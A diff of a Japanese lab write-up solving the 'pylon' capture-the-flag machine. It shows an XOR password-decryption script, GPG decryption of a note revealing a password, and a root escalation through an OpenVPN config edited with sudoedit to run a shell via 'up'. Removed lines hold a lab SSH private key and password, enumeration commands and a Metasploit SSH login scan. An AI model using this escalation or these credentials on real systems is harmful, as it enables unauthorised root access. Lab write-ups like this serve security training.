@@ -31,7 +31,7 @@ SSHが２つ。
 
 ## 添付ファイル
 
-exiftool を実行すると、Base85が示唆されている。
+exiftool を実行すると、Hex, Base85 のチェーンが示唆されている。
 
 ```
 Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
@@ -243,142 +243,128 @@ drwxrwxr-x 8 lone lone 4096 Dec 14 01:35 .git
 過去のコミットにdbファイルが含まれていた。
 
 ```sh
-lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da^C
+lone@pylon:~/pylon$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
 
 lone@pylon:~/pylon$ ls
 README.txt  banner.b64  pyLon.db  pyLon_crypt.py  pyLon_db.py  pyLon_pwMan.py
 ```
 
-pylon.thm_gpg_key / lone_gpg_key が入っていた。これを使ってgpgで復号化しようとしたが、失敗。
+pylon.thm_gpg_key / lone_gpg_key が入っていた。これをそのまま使ってgpgで復号化しようとしたが、失敗。
 
 ```
-40703ac897fd8cfdffc97947981e88a1
+40703[REDACTED]
 ```
 
-```
-222 id_rsa
-2_[-I2_[0E2DmEK
+pyLon_crypt.py をもとに、XORで復号する。
 
-22 password
-Username = lone
-Password = +2BRkRuE!w7>ozQ4
+```python
+from hashlib import md5
+from binascii import hexlify, unhexlify
+from random import shuffle, randint
 
+def decrypt_password(cypher_text: str):
+    """ decryption method for password """
+    passphrase = b"[REDACTED]"
+    passphrase_integer = int(md5(passphrase).hexdigest(), 16)
+    encrypted_integer = int(cypher_text, 16)
+    plain_text = str(unhexlify(hex(passphrase_integer ^ encrypted_integer)[2:]), "utf8")
+    return plain_text
 
-
-```
-
-```
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAQEA45nVhEtT37sKnNBWH2VYsXbjA8vAK8e04HfrgF06NiGGQsRBLtJw
-YJu73+zGO0AoETo8LYhxB5eI5D9KzboGuTDAuGZQuUq+8N/hBmfavieHLHgkRNBr0ErJ60
-l2FAcDW6pDowfiwC1vsdixQ6L8kvVhdkz0GUfPAlfIRhHHtQaQnQ7wnRtdGjIPK9/S1MPs
-IJOLD2S79NxS7vguw87Mp0cnRjDalaCcRE0ELUvLDKQdZlWba0kF/PciqknkDYq2mbkCRd
-3jWX2Umx0WtP2wCh9BQ/syxTJDXn6mCEsoNI/roLKyB1uGms/pFiBxS0qdiZAAO6CyTkyG
-hZwb1BKmUwAAA8hSynq9Usp6vQAAAAdzc2gtcnNhAAABAQDjmdWES1Pfuwqc0FYfZVixdu
-MDy8Arx7Tgd+uAXTo2IYZCxEEu0nBgm7vf7MY7QCgROjwtiHEHl4jkP0rNuga5MMC4ZlC5
-Sr7w3+EGZ9q+J4cseCRE0GvQSsnrSXYUBwNbqkOjB+LALW+x2LFDovyS9WF2TPQZR88CV8
-hGEce1BpCdDvCdG10aMg8r39LUw+wgk4sPZLv03FLu+C7DzsynRydGMNqVoJxETQQtS8sM
-pB1mVZtrSQX89yKqSeQNiraZuQJF3eNZfZSbHRa0/bAKH0FD+zLFMkNefqYISyg0j+ugsr
-IHW4aaz+kWIHFLSp2JkAA7oLJOTIaFnBvUEqZTAAAAAwEAAQAAAQB+u03U2EzfqzqBjtAl
-szzrtBM8LdvXhOAGjT+ovkCHm6syyiyxcaP5Zz35tdG7dEHbNd4ETJEDdTFYRpXUb90GiU
-sGYpJYWnJvlXmrI3D9qOzvqgYn+xXNaZd9V+5TwIPyKqB2yxFLiQFEujAaRUr2WYPnZ3oU
-CZQO7eoqegQFm5FXLy0zl0elAkEiDrrpS5CNBunv297nHMLFBPIEB231MNbYMDe0SU40NQ
-WAGELdiAQ9i7N/SMjAJYAV2MAjbbzp5uKDUNxb3An85rUWKHXslATDh25abIY0aGZHLP5x
-4B1usmPPLxGTqX19Cm65tkw8ijM6AM9+y4TNj2i3GlQBAAAAgQDN+26ilDtKImrPBv+Akg
-tjsKLL005RLPtKQAlnqYfRJP1xLKKz7ocYdulaYm0syosY+caIzAVcN6lnFoBrzTZ23uwy
-VB0ZsRL/9crywFn9xAE9Svbn6CxGBYQVO6xVCp+GiIXQZHpY7CMVBdANh/EJmGfCJ/gGby
-mut7uOWmfiJAAAAIEA9ak9av7YunWLnDp6ZyUfaRAocSPxt2Ez8+j6m+gwYst+v8cLJ2SJ
-duq0tgz7za8wNrUN3gXAgDzg4VsBUKLS3i41h1DmgqUE5SWgHrhIJw9AL1fo4YumPUkB/0
-S0QMUn16v4S/fnHgZY5KDKSl4hRre5byrsaVK0oluiKsouR4EAAACBAO0uA2IvlaUcSerC
-0OMkML9kGZA7uA52HKR9ZE/B4HR9QQKN4sZ+gOPfiQcuKYaDrfmRCeLddrtIulqY4amVcR
-nx3u2SBx9KM6uqA2w80UlqJb8BVyM4SscUoHdmbqc9Wx5f+nG5Ab8EPPq0FNPrzrBJP5m0
-43kcLdLe8Jv/ETfTAAAAC3B5bG9uQHB5bG9uAQIDBAUGBw==
------END OPENSSH PRIVATE KEY-----
+print(decrypt_password("40703[REDACTED]"))
 ```
 
-## 権限昇格
+gpg ファイルを復号。openvpnに関するメッセージ。poodのパスワード付き。
 
 ```sh
-# env_keep+=LD_PRELOAD は見落としがちなので注意
-sudo -l
+lone@pylon:~$ gpg --decrypt ./note_from_pood.gpg 
+gpg: Note: secret key D83FA5A7160FFE57 expired at Fri Jan 27 19:13:48 2023 UTC
+gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27
+      "lon E <lone@pylon.thm>"
+Hi Lone,
+
+Can you please fix the openvpn config?
+
+It's not behaving itself again.
+
+oh, by the way, my password is [REDACTED]
+
+Thanks again.
 ```
 
-```sh
-find / -perm -u=s -type f -ls 2>/dev/null
-```
+## 権限昇格２
 
 ```sh
-find / -user <name> -type f -not -path "/proc/*" 2>/dev/null
-find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
+pood@pylon:~$ ls -al
+total 36
+drwxr-x--- 5 pood pood 4096 Jan 30  2021 .
+drwxr-xr-x 5 root root 4096 Jan 30  2021 ..
+lrwxrwxrwx 1 pood pood    9 Jan 30  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 pood pood  220 Jan 30  2021 .bash_logout
+-rw-r--r-- 1 pood pood 3771 Jan 30  2021 .bashrc
+drwx------ 2 pood pood 4096 Jan 30  2021 .cache
+drwx------ 4 pood pood 4096 Jan 30  2021 .gnupg
+drwxr-xr-x 3 pood pood 4096 Jan 30  2021 .local
+-rw-r--r-- 1 pood pood  807 Jan 30  2021 .profile
+-rw-rw-r-- 1 pood pood   29 Jan 30  2021 user2.txt
 ```
 
+/opt/openvpn/client.ovpn を sudoedit で編集する権限がある。
+
 ```sh
-getcap -r / 2>/dev/null
-ls -al /var/backups
-cat /etc/crontab
-cat /etc/exports
+pood@pylon:~$ sudo -l
+[sudo] password for pood: 
+Matching Defaults entries for pood on pylon:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pood may run the following commands on pylon:
+    (root) sudoedit /opt/openvpn/client.ovpn
+```
+
+openvpnの権限昇格には下記の方法があり、これをclient.ovpnの設定によって再現することは可能か？
+
+```sh
+sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+```
+
+/opt/openvpn/client.ovpn を下記の3行だけにする。
+
+```sh
+dev null
+script-security 2
+up "/bin/sh -c sh"
+```
+
+昇格成功！
+
+```sh
+lone@pylon:~$ sudo /usr/sbin/openvpn /opt/openvpn/client.ovpn
+Mon Dec 15 01:56:19 2025 disabling NCP mode (--ncp-disable) because not in P2MP client or server mode
+Mon Dec 15 01:56:19 2025 OpenVPN 2.4.4 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2019
+Mon Dec 15 01:56:19 2025 library versions: OpenSSL 1.1.1  11 Sep 2018, LZO 2.08
+Mon Dec 15 01:56:19 2025 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
+Mon Dec 15 01:56:19 2025 ******* WARNING *******: All encryption and authentication features disabled -- All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!
+Mon Dec 15 01:56:19 2025 /bin/sh -c sh null 1500 1500   init
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+フラグがgpgファイルになっていたが、パスフレーズなしで復号できた。
+
+```sh
+# gpg --decrypt ./root.txt.gpg
+gpg: Note: secret key 91B77766BE20A385 expired at Fri Jan 27 19:04:03 2023 UTC
+gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
+      "I am g ROOT <root@pylon.thm>"
+ThM{[REDACTED]}
 ```
 
 ## 振り返り
 
--
--
+- 多くのパスフレーズとパスワードが飛び交うため混乱した。整理できれば納得。
+- `H4sIAAA...` が、gzip をBase64エンコードしたときにあらわれる文字列であることは覚えておきたい。
+- openvpn の設定ファイルを使うテクニックは覚えておきたい。
 
 ## Tags
 
-#tags:ステガノグラフィー #tags:puzzle #tags:
-
-```sh
-# 大分類（Linuxはタグ付けしない）
-Window Kerberos pwn pwn(Windows) Crypto puzzle ウサギの穴 LLM
-
-# 脆弱性の種類
-CVE-xxxx-yyyyy カーネルエクスプロイト
-ツール脆弱性 sudo脆弱性 PHP脆弱性 exiftool脆弱性 アプリケーション保存の認証情報
-
-# 攻撃の種類
-サービス LFI SSRF XSS SQLインジェクション 競合 フィルターバイパス アップロードフィルターバイパス ポートノッキング PHPフィルターチェーン レート制限回避 XSSフィルターバイパス　SSTIフィルターバイパス RequestCatcher プロンプトインジェクション Defender回避 リバースコールバック LD_PRELOAD
-
-# ツールなど
-docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git tmux john redis rsync pip potato ligolo-ng insmod pickle
-```
-
-## メモ
-
-### シェル安定化
-
-```shell
-# python が無くても、python3 でいける場合もある
-python -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-```
-
-### SSH
-
-ユーザー名、パスワード（スペース区切り）ファイルを使ってSSHスキャンする
-
-```sh
-msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.10.165.96; set USERPASS_FILE creds.txt; run; exit"
-```
-
-エラー
-
-```sh
-# no matching host key type found. Their offer: ssh-rsa,ssh-dss
-# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
--oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
-```
+#tags:ステガノグラフィー #tags:openvpn
